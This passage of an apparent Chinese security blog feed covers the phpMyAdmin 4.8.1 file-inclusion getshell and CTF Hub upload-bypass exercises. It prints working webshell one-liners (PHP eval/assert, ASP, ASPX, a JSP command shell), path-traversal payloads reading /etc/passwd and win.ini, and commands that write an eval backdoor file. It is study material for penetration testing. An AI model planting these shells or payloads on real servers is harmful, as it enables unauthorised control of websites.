class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">'general%'</span>;</span><br><span class="line">+------------------+---------------------------------------+</span><br><span class="line">| Variable_name    | Value                                 |</span><br><span class="line">+------------------+---------------------------------------+</span><br><span class="line">| general_log      | ON                                    |</span><br><span class="line">| general_log_file | C:/PhpStudy/PHPTutorial/WWW/shell.php |</span><br><span class="line">+------------------+---------------------------------------+</span><br></pre></td></tr></table></figure><p>因为日志会记录任何数据，这个时候直接输入：<code>&#39;&lt;?php phpinfo();?&gt;&#39;</code> 尽管已经报错了：</p><p><img src="http://qiniuyun.lintstar.top/image-20200512132844872.png" alt="image-20200512132844872"></p><p>但是数据库日志文件里面已经记录对应的语句文件：</p><p><img src="http://qiniuyun.lintstar.top/image-20200512132952817.png" alt="image-20200512132952817"></p><p>浏览器访问验证效果：</p><p><img src="http://qiniuyun.lintstar.top/image-20200512133021812.png" alt="image-20200512133021812"></p><h2 id="文件包含-session-利用"><a href="#文件包含-session-利用" class="headerlink" title="文件包含 session 利用"></a>文件包含 session 利用</h2><p>phpMyAdmin4.8.X 版本中的本地文件包含漏洞：phpmyadmin4.8.1后台getshell。该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows文件包含</span></span><br><span class="line">/index.php?target=db_sql.php%253f/../../../../../../../../../../windows/win.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux文件包含</span></span><br><span class="line">/index.php?target=db_sql.php%253f/../../../../../../../../../../etc/passwd</span><br><span class="line">/index.php?target=db_sql.php%253f/../../../../../../../../../../etc/hosts</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200512140536183.png" alt="image-20200512140536183"></p><p>执行一个敏感的语句：</p><p><img src="http://qiniuyun.lintstar.top/image-20200512145432959.png" alt="image-20200512145432959"></p><p>本次测试环境的 session 的位置是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\PhpStudy\PHPTutorial\tmp\tmp\sess_PHPSESSID</span><br></pre></td></tr></table></figure><p>可以通过审查元素或者抓包来查看当前的 session：</p><p><img src="http://qiniuyun.lintstar.top/image-20200512145000206-9266200.png" alt="image-20200512145000206-9266200"></p><p>查找对应的文件来看看：</p><p><img src="http://qiniuyun.lintstar.top/image-20200512145523589.png" alt="image-20200512145523589"></p><p>然后尝试去包含这个 session 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?target=db_sql.php%253f/../../../../../../../../../../PhpStudy/PHPTutorial/tmp/tmp/sess_282p45oo4a4bjb4i7d1h2hdr58coi87i</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200512145805568.png" alt="image-20200512145805568"></p><p>尝试更复杂的语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">'echo ^&lt;?php eval($_POST[gg])?^&gt; &gt; gg.php'</span>)?&gt;</span><br><span class="line"><span class="comment"># 手动生成木马再连</span></span><br><span class="line">&lt;?php fputs(fopen(<span class="string">'gg.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[gg])?&gt;'</span>);?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP文件包含漏洞&quot;&gt;&lt;a href=&quot;#PHP文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;PHP文件包含漏洞&quot;&gt;&lt;/a&gt;PHP文件包含漏洞&lt;/h1&gt;&lt;p&gt;下面是两个看上去比较啰嗦的 php 文件，运行的效果几乎是一致的：&lt;/p&gt;
&lt;p&gt;&lt;
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined04/931c692.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined04/931c692.html</id>
    <published>2020-08-04T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:43.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="文件上传漏洞简介"><a href="#文件上传漏洞简介" class="headerlink" title="文件上传漏洞简介"></a>文件上传漏洞简介</h2><p>现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，比如企业的 OA 系统，允许用户上传图片、视频、头像和许多其他类型的文件。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应 用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。</p><h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>上传文件时，如果服务端代码没有对客户端上传的文件进行严格的验证和过滤， 就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。</p><h2 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h2><p>非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门， WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><p>WebShell 就是以 ASP、PHP、JSP 等网页脚本存在的一种命令执行环节，通常也叫做网页后门。攻击者在入侵了一个网站后，通常会将 WebShell 上传到网站的根目录下或者插入到正常的网页中，然后使用浏览器或者对应的 WebShell 客户端来访问这些后门，将会得到一个命令执行的环境，以达到控制网站服务器的目的。</p><ul><li><strong>ASP</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;x&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%execute request(&quot;x&quot;)%&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>ASPX</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;x&quot;],”unsafe”);%&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>PHP</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'x'</span>])<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">'x'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>JSP CMD WebShell</strong></li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"x"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>在大多数情况下，要完成文件上传漏洞这个攻击，要满足如下几个条件：</p><ul><li>首先，上传的文件能够被 Web 容器解释执行。所以文件上传后所在的目录要是 Web 容器所覆盖到的路径。</li><li>其次，用户能够从 Web 上访问这个文件。如果文件上传了，但用户无法通过 Web 访问，或者无法使得 Web容器解释这个脚本，那么也不能称之为漏洞。</li><li>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</li></ul><h1 id="CTF-Hub-文件上传"><a href="#CTF-Hub-文件上传" class="headerlink" title="CTF Hub 文件上传"></a>CTF Hub 文件上传</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>因为没有验证，所以可以直接上传一个一句话木马：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714142636267.png" alt="image-20200714142636267"></p><p>通过提示得知一句话木马的路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:10080/upload/shell.php</span><br></pre></td></tr></table></figure><p>蚁剑连接在网站根目录下可以找到 flag 的 PHP 文件，打开即可获得 Flag</p><h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p><code>一般弹窗都是前端验证</code></p><p>JS 前端验证，上传一个 shell.php 发现提示不允许上传：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714143149657.png" alt="image-20200714143149657"></p><p>审查元素发现 JS 代码中出现了文件后缀判断的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkfilesuffix</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file=<span class="built_in">document</span>.getElementsByName(<span class="string">'file'</span>)[<span class="number">0</span>][<span class="string">'value'</span>];</span><br><span class="line">    <span class="keyword">if</span>(file==<span class="string">""</span>||file==<span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        alert(<span class="string">"请添加上传文件"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">".jpg"</span>,<span class="string">".png"</span>,<span class="string">".gif"</span>);</span><br><span class="line">        <span class="keyword">var</span> file_suffix=file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="keyword">if</span>(whitelist.indexOf(file_suffix) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            alert(<span class="string">"该文件不允许上传"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>可以直接通过 Chrome 来调试这窜 JS 进行绕过，下断点直接修改值：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714143726569.png" alt="image-20200714143726569"></p><p><code>断点要从26行下移到27行然后放包</code></p><p>本题通过 BP 抓包也是可以直接绕过的，正常的思路一般就是直接通过 BP 抓包，这里的 JS 调试只当做是一个小技巧来学习，并不是主流的上传绕过方式。</p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a><strong>.htaccess</strong></h2><p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>先上传一个名为<code>.htaccess</code>的文件，内容为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200803112126.png" alt="20200803112126"></p><p>这表示让 png 后缀的文件当做 PHP 来解析：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714144714458.png" alt="image-20200714144714458"></p><p>此时上传一个 png 图片，但是图片内容是 PHP：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714145500778.png" alt="image-20200714145500778"></p><p>此时使用中国蚁剑可以直接连接成功</p><h2 id="MIME-绕过"><a href="#MIME-绕过" class="headerlink" title="MIME 绕过"></a><strong>MIME 绕过</strong></h2><p><strong>媒体类型</strong>（通常称为 <strong>Multipurpose Internet Mail Extensions</strong> 或 <strong>MIME</strong> 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。</p><p>本关直接修改 Content-Type 即可实现上传绕过：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714150400457.png" alt="image-20200714150400457"></p><p><a href="https://blog.csdn.net/qq_19916577/article/details/46502761" target="_blank" rel="noopener">MimeTypes表</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line">mimes = [(&quot;ez&quot;, &quot;application/andrew-inset&quot;), (&quot;anx&quot;, &quot;application/annodex&quot;),</span><br><span class="line">         (&quot;atom&quot;, &quot;application/atom+xml&quot;),</span><br><span class="line">         (&quot;atomcat&quot;, &quot;application/atomcat+xml&quot;),</span><br><span class="line">         (&quot;atomsrv&quot;, &quot;application/atomserv+xml&quot;), (&quot;lin&quot;, &quot;application/bbolin&quot;),</span><br><span class="line">         (&quot;cap&quot;, &quot;application/cap&quot;), (&quot;pcap&quot;, &quot;application/cap&quot;),</span><br><span class="line">         (&quot;cu&quot;, &quot;application/cu-seeme&quot;),</span><br><span class="line">         (&quot;davmount&quot;, &quot;application/davmount+xml&quot;),</span><br><span class="line">         (&quot;tsp&quot;, &quot;application/dsptype&quot;), (&quot;es&quot;, &quot;application/ecmascript&quot;),</span><br><span class="line">         (&quot;spl&quot;, &quot;application/futuresplash&quot;), (&quot;hta&quot;, &quot;application/hta&quot;),</span><br><span class="line">         (&quot;jar&quot;, &quot;application/java-archive&quot;),</span><br><span class="line">         (&quot;ser&quot;, &quot;application/java-serialized-object&quot;),</span><br><span class="line">         (&quot;class&quot;, &quot;application/java-vm&quot;), (&quot;js&quot;, &quot;application/javascript&quot;),</span><br><span class="line">         (&quot;m3g&quot;, &quot;application/m3g&quot;), (&quot;hqx&quot;, &quot;application/mac-binhex40&quot;),</span><br><span class="line">         (&quot;cpt&quot;, &quot;application/mac-compactpro&quot;),</span><br><span class="line">         (&quot;nb&quot;, &quot;application/mathematica&quot;), (&quot;nbp&quot;, &quot;application/mathematica&quot;),</span><br><span class="line">         (&quot;mdb&quot;, &quot;application/msaccess&quot;), (&quot;doc&quot;, &quot;application/msword&quot;),</span><br><span class="line">         (&quot;dot&quot;, &quot;application/msword&quot;), (&quot;mxf&quot;, &quot;application/mxf&quot;),</span><br><span class="line">         (&quot;bin&quot;, &quot;application/octet-stream&quot;), (&quot;oda&quot;, &quot;application/oda&quot;),</span><br><span class="line">         (&quot;ogx&quot;, &quot;application/ogg&quot;), (&quot;pdf&quot;, &quot;application/pdf&quot;),</span><br><span class="line">         (&quot;key&quot;, &quot;application/pgp-keys&quot;), (&quot;pgp&quot;, &quot;application/pgp-signature&quot;),</span><br><span class="line">         (&quot;prf&quot;, &quot;application/pics-rules&quot;), (&quot;ps&quot;, &quot;application/postscript&quot;),</span><br><span class="line">         (&quot;ai&quot;, &quot;application/postscript&quot;), (&quot;eps&quot;, &quot;application/postscript&quot;),</span><br><span class="line">         (&quot;epsi&quot;, &quot;application/postscript&quot;), (&quot;epsf&quot;, &quot;application/postscript&quot;),</span><br><span class="line">         (&quot;eps2&quot;, &quot;application/postscript&quot;), (&quot;eps3&quot;, &quot;application/postscript&quot;),</span><br><span class="line">         (&quot;rar&quot;, &quot;application/rar&quot;), (&quot;rdf&quot;, &quot;application/rdf+xml&quot;),</span><br><span class="line">         (&quot;rss&quot;, &quot;application/rss+xml&quot;), (&quot;rtf&quot;, &quot;application/rtf&quot;),</span><br><span class="line">         (&quot;smi&quot;, &quot;application/smil&quot;), (&quot;smil&quot;, &quot;application/smil&quot;),</span><br><span class="line">         (&quot;xhtml&quot;, &quot;application/xhtml+xml&quot;), (&quot;xht&quot;, &quot;application/xhtml+xml&quot;),</span><br><span class="line">         (&quot;xml&quot;, &quot;application/xml&quot;), (&quot;xsl&quot;, &quot;application/xml&quot;),</span><br><span class="line">         (&quot;xsd&quot;, &quot;application/xml&quot;), (&quot;xspf&quot;, &quot;application/xspf+xml&quot;),</span><br><span class="line">         (&quot;zip&quot;, &quot;application/zip&quot;),</span><br><span class="line">         (&quot;apk&quot;, &quot;application/vnd.android.package-archive&quot;),</span><br><span class="line">         (&quot;cdy&quot;, &quot;application/vnd.cinderella&quot;),</span><br><span class="line">         (&quot;kml&quot;, &quot;application/vnd.google-earth.kml+xml&quot;),</span><br><span class="line">         (&quot;kmz&quot;, &quot;application/vnd.google-earth.kmz&quot;),</span><br><span class="line">         (&quot;xul&quot;, &quot;application/vnd.mozilla.xul+xml&quot;),</span><br><span class="line">         (&quot;xls&quot;, &quot;application/vnd.ms-excel&quot;),</span><br><span class="line">         (&quot;xlb&quot;, &quot;application/vnd.ms-excel&quot;),</span><br><span class="line">         (&quot;xlt&quot;, &quot;application/vnd.ms-excel&quot;),</span><br><span class="line">         (&quot;cat&quot;, &quot;application/vnd.ms-pki.seccat&quot;),</span><br><span class="line">         (&quot;stl&quot;, &quot;application/vnd.ms-pki.stl&quot;),</span><br><span class="line">         (&quot;ppt&quot;, &quot;application/vnd.ms-powerpoint&quot;),</span><br><span class="line">         (&quot;pps&quot;, &quot;application/vnd.ms-powerpoint&quot;), (&quot;xlsx&quot;,</span><br><span class="line">    &quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;), (</span><br><span class="line">    &quot;xltx&quot;,</span><br><span class="line">    &quot;application/vnd.openxmlformats-officedocument.spreadsheetml.template&quot;), (</span><br><span class="line">    &quot;pptx&quot;,</span><br><span class="line">    &quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;), (</span><br><span class="line">    &quot;ppsx&quot;,</span><br><span class="line">    &quot;application/vnd.openxmlformats-officedocument.presentationml.slideshow&quot;), (</span><br><span class="line">    &quot;potx&quot;,</span><br><span class="line">    &quot;application/vnd.openxmlformats-officedocument.presentationml.template&quot;), (</span><br><span class="line">    &quot;docx&quot;,</span><br><span class="line">    &quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;), (</span><br><span class="line">    &quot;dotx&quot;,</span><br><span class="line">    &quot;application/vnd.openxmlformats-officedocument.wordprocessingml.template&quot;),</span><br><span class="line">         (&quot;cod&quot;, &quot;application/vnd.rim.cod&quot;), (&quot;mmf&quot;, &quot;application/vnd.smaf&quot;),</span><br><span class="line">         (&quot;sis&quot;, &quot;application/vnd.symbian.install&quot;),</span><br><span class="line">         (&quot;vsd&quot;, &quot;application/vnd.visio&quot;),</span><br><span class="line">         (&quot;wbxml&quot;, &quot;application/vnd.wap.wbxml&quot;),</span><br><span class="line">         (&quot;wmlc&quot;, &quot;application/vnd.wap.wmlc&quot;),</span><br><span class="line">         (&quot;wmlsc&quot;, &quot;application/vnd.wap.wmlscriptc&quot;),</span><br><span class="line">         (&quot;wpd&quot;, &quot;application/vnd.wordperfect&quot;),</span><br><span class="line">         (&quot;wp5&quot;, &quot;application/vnd.wordperfect5.1&quot;), (&quot;wk&quot;, &quot;application/x-123&quot;),</span><br><span class="line">         (&quot;7z&quot;, &quot;application/x-7z-compressed&quot;),</span><br><span class="line">         (&quot;abw&quot;, &quot;application/x-abiword&quot;),</span><br><span class="line">         (&quot;dmg&quot;, &quot;application/x-apple-diskimage&quot;),</span><br><span class="line">         (&quot;bcpio&quot;, &quot;application/x-bcpio&quot;),</span><br><span class="line">         (&quot;torrent&quot;, &quot;application/x-bittorrent&quot;), (&quot;cab&quot;, &quot;application/x-cab&quot;),</span><br><span class="line">         (&quot;cbr&quot;, &quot;application/x-cbr&quot;), (&quot;cbz&quot;, &quot;application/x-cbz&quot;),</span><br><span class="line">         (&quot;cdf&quot;, &quot;application/x-cdf&quot;), (&quot;cda&quot;, &quot;application/x-cdf&quot;),</span><br><span class="line">         (&quot;vcd&quot;, &quot;application/x-cdlink&quot;), (&quot;pgn&quot;, &quot;application/x-chess-pgn&quot;),</span><br><span class="line">         (&quot;cpio&quot;, &quot;application/x-cpio&quot;), (&quot;csh&quot;, &quot;application/x-csh&quot;),</span><br><span class="line">         (&quot;deb&quot;, &quot;application/x-debian-package&quot;),</span><br><span class="line">         (&quot;udeb&quot;, &quot;application/x-debian-package&quot;),</span><br><span class="line">         (&quot;dcr&quot;, &quot;application/x-director&quot;), (&quot;dir&quot;, &quot;application/x-director&quot;),</span><br><span class="line">         (&quot;dxr&quot;, &quot;application/x-director&quot;), (&quot;dms&quot;, &quot;application/x-dms&quot;),</span><br><span class="line">         (&quot;wad&quot;, &quot;application/x-doom&quot;), (&quot;dvi&quot;, &quot;application/x-dvi&quot;),</span><br><span class="line">         (&quot;rhtml&quot;, &quot;application/x-httpd-eruby&quot;), (&quot;pfa&quot;, &quot;application/x-font&quot;),</span><br><span class="line">         (&quot;pfb&quot;, &quot;application/x-font&quot;), (&quot;gsf&quot;, &quot;application/x-font&quot;),</span><br><span class="line">         (&quot;pcf&quot;, &quot;application/x-font&quot;), (&quot;pcf.Z&quot;, &quot;application/x-font&quot;),</span><br><span class="line">         (&quot;mm&quot;, &quot;application/x-freemind&quot;),</span><br><span class="line">         (&quot;spl&quot;, &quot;application/x-futuresplash&quot;),</span><br><span class="line">         (&quot;gnumeric&quot;, &quot;application/x-gnumeric&quot;),</span><br><span class="line">         (&quot;sgf&quot;, &quot;application/x-go-sgf&quot;),</span><br><span class="line">         (&quot;gcf&quot;, &quot;application/x-graphing-calculator&quot;),</span><br><span class="line">         (&quot;gtar&quot;, &quot;application/x-gtar&quot;), (&quot;tgz&quot;, &quot;application/x-gtar&quot;),</span><br><span class="line">         (&quot;taz&quot;, 